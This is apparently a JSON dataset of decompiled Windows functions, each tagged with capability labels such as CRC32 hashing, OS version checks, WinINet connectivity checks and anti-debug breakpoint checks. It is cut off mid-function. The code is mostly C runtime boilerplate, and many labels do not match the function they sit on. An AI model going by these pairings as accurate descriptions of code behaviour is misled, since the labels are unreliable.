{
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004086bc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004086bc(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.0040452c();\n    var_4h = 0;\n    if (*0x4219f8 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"USER32.DLL\");\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"MessageBoxA\");\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x4219f8 = fcn.004044ba(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, \"GetActiveWindow\");\n        *0x4219fc = fcn.004044ba(uVar3);\n        uVar3 = (*pcVar4)(iVar2, \"GetLastActivePopup\");\n        *0x421a00 = fcn.004044ba(uVar3);\n        uVar3 = (*pcVar4)(iVar2, \"GetUserObjectInformationA\");\n        *0x421a08 = fcn.004044ba(uVar3);\n        if (*0x421a08 != 0) {\n            uVar3 = (*pcVar4)(iVar2, \"GetProcessWindowStation\");\n            *0x421a04 = fcn.004044ba(uVar3);\n        }\n    }\n    if ((*0x421a04 != iVar1) && (*0x421a08 != iVar1)) {\n        pcVar4 = fcn.00404535(*0x421a04);\n        pcVar5 = fcn.00404535(*0x421a08);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x004087fe;\n        }\n    }\n    if ((((*0x4219fc != iVar1) && (pcVar4 = fcn.00404535(*0x4219fc),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0x421a00 != iVar1 && (pcVar4 = fcn.00404535(*0x421a00),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x004087fe:\n    pcVar4 = fcn.00404535(*0x4219f8);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 811
    },
    "0040a68e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040a68e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4130a0 ^ &stack0xfffffffc;\n    fcn.00402e8f(arg_10h);\n    var_14h = fcn.0040b814(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040ad8c(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040a6e7:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040a727;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040a719:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040a727;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040a719;\n        goto code_r0x0040a6e7;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040a727:\n    fcn.00401799(unaff_EBX);\n    return;\n}\n",
        "token_count": 510
    },
    "0040a736": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040a736(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4130a0 ^ &stack0xfffffffc;\n    fcn.00402e8f(arg_10h);\n    var_14h = fcn.0040b814(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040b2d0(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040a78f:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040a7cf;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040a7c1:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040a7cf;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040a7c1;\n        goto code_r0x0040a78f;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040a7cf:\n    fcn.00401799(unaff_EBX);\n    return;\n}\n",
        "token_count": 515
    },
    "00401190": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00401190(int32_t param_1, char param_2, int32_t param_3)\n\n{\n    uint arg_10h;\n    \n    if ((param_2 != '\\0') && (0xf < *(param_1 + 0x18))) {\n        arg_10h = *(param_1 + 4);\n        if (param_3 != 0) {\n            fcn.00401a79(param_1 + 4, 0x10, arg_10h, param_3);\n        }\n        fcn.00401a6e(arg_10h);\n    }\n    *(param_1 + 0x14) = param_3;\n    *(param_1 + 0x18) = 0xf;\n    *(param_1 + 4 + param_3) = 0;\n    return;\n}\n",
        "token_count": 190
    },
    "00401370": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch_3\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __thiscall fcn.00401370(int32_t param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint *arg_8h;\n    int32_t arg_10h;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t *in_FS_OFFSET;\n    uint32_t var_4h;\n    uint var_8h;\n    uint var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    uint32_t uStack60;\n    code *apcStack44 [3];\n    uint var_28h;\n    uint uStack28;\n    int32_t iStack24;\n    uint32_t *puStack20;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h_2;\n    uint var_ch_3;\n    \n    var_14h = 0x40f020;\n    var_18h = *in_FS_OFFSET;\n    uStack60 = *0x4130a0 ^ &var_ch_3;\n    puStack20 = &uStack60;\n    *in_FS_OFFSET = &var_18h;\n    uVar4 = var_4h | 0xf;\n    uVar5 = var_4h;\n    if (uVar4 != 0xffffffff) {\n        uVar1 = *(param_1 + 0x18);\n        uVar3 = uVar1 >> 1;\n        uVar5 = uVar4;\n        if ((uVar4 / 3 < uVar3) && (uVar1 <= -uVar3 - 2)) {\n            uVar5 = uVar3 + uVar1;\n        }\n    }\n    uVar4 = uVar5 + 1;\n    var_10h_2 = 0;\n    iStack24 = param_1;\n    if (uVar4 == 0) {\n        uVar4 = 0;\n    }\n    else if (0xffffffff / uVar4 == 0) {\n        uStack28 = 0;\n        fcn.00401816(&uStack28);\n        apcStack44[0] = vtable.std::bad_alloc.0;\n        fcn.00401e0b(apcStack44, 0x412698);\n        var_10h_2 = CONCAT31(var_10h_2._1_3_, 2);\n        puStack20 = &stack0xffffffb8;\n        fcn.004014f0(var_4h + 1);\n        return 0x40144c;\n    }\n    puStack20 = &uStack60;\n    arg_8h = fcn.00401b62(uVar4);\n    var_10h_2 = 0xffffffff;\n    if (param_3 != 0) {\n        if (*(param_1 + 0x18) < 0x10) {\n            arg_10h = param_1 + 4;\n        }\n        else {\n            arg_10h = *(param_1 + 4);\n        }\n        fcn.00401a79(arg_8h, uVar5 + 1, arg_10h, param_3);\n    }\n    if (0xf < *(param_1 + 0x18)) {\n        fcn.00401a6e();\n    }\n    puVar2 = param_1 + 4;\n    *puVar2 = 0;\n    *puVar2 = arg_8h;\n    *(param_1 + 0x18) = uVar5;\n    *(param_1 + 0x14) = param_3;\n    if (0xf < uVar5) {\n        puVar2 = arg_8h;\n    }\n    *(puVar2 + param_3) = 0;\n    *in_FS_OFFSET = var_18h;\n    return puVar2;\n}\n",
        "token_count": 895
    },
    "004014f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004014f0(uint32_t param_1)\n\n{\n    code *pcVar1;\n    uint32_t arg_8h;\n    \n    if (param_1 == 0) {\n        arg_8h = 0;\n    }\n    else {\n        arg_8h = param_1;\n        if (0xffffffff / param_1 == 0) {\n            param_1 = 0;\n            fcn.00401816(&param_1);\n            fcn.00401e0b(&stack0xfffffff0, 0x412698);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    fcn.00401b62(arg_8h);\n    return;\n}\n",
        "token_count": 165
    },
    "004018e3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004018e3(code **param_1)\n\n{\n    *param_1 = vtable.std::exception.0;\n    if (param_1[2] != NULL) {\n        fcn.00402a68(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "00401799": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401799(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x4130a0) {\n        return;\n    }\n    *0x421058 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x42105c = &arg_8h;\n    *0x420f98 = 0x10001;\n    *0x420f40 = 0xc0000409;\n    *0x420f44 = 1;\n    var_328h = *0x4130a0;\n    var_324h = *0x4130a4;\n    *0x420f4c = unaff_retaddr;\n    *0x421024 = in_GS;\n    *0x421028 = in_FS;\n    *0x42102c = in_ES;\n    *0x421030 = in_DS;\n    *0x421034 = unaff_EDI;\n    *0x421038 = unaff_ESI;\n    *0x42103c = unaff_EBX;\n    *0x421040 = in_EDX;\n    *0x421044 = in_ECX;\n    *0x421048 = in_EAX;\n    *0x42104c = unaff_EBP;\n    *0x421050 = unaff_retaddr;\n    *0x421054 = in_CS;\n    *0x421060 = in_SS;\n    *0x420f90 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.00405aac(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x4102d0);\n    if (*0x420f90 == 0) {\n        fcn.00405aac(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 816
    },
    "00401f5b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00401f5b(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x402006;\n        var_38h = 1;\n    }\n    else {\n        pcStack40 = fcn.00402032;\n        uStack36 = *0x4130a0 ^ &fcn.00401f5b::var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.00401f5b::var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.00404781();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &fcn.00401f5b::var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 725
    },
    "00403991": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00403a84: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00403a89)\n// WARNING: Removing unreachable block (ram,0x00403ab7)\n// WARNING: Removing unreachable block (ram,0x00403a8f)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00403991(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00404a88(0x4122c8, 0x18);\n    fcn.00405d9a(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x4212a8 != 1) {\n        *0x4212a4 = 1;\n        *0x4212a0 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.00404535(*0x49b868);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.00404535(*0x49b864);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.0040452c();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.00404535(*piVar2);\n                        iVar3 = fcn.0040452c();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.00404535(*0x49b868);\n                        piVar1 = fcn.00404535(*0x49b864);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.004038cb(0x41019c);\n        }\n        fcn.004038cb(0x4101a4);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.00405cc0(8);\n    }\n    return;\n}\n",
        "token_count": 797
    },
    "00404ed0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00404ed0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00404781();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.00404781();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "00405198": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405198(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.00402199(*(unaff_EBP + -0x28));\n    iVar1 = fcn.00404781();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.00404781();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.00402172(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.00404f30(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 377
    },
    "004085f3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004085f3(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.00405cc0(0);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "0040ad8c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ad8c(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0040b28d;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = str.5_v_[0] + L'\\xffffffff';\n        iVar4 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        uVar9 = str.5_v_[0] & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0040aec1;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0040aec8;\ncode_r0x0040aec1:\n                        do {\n                            var_4h = 1;\ncode_r0x0040aec8:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0040aed6;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0040aed6:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x413e04 - str.5_v_[0]) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x413e04 < iVar12) {\n                if (iVar12 < *0x413e00) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + str.5_v_[3];\n                    iVar4 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = str.5_v_[3] + *0x413e00;\n                    uVar5 = 1;\n                }\n                goto code_r0x0040b28d;\n            }\n            var_10h = *0x413e04 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    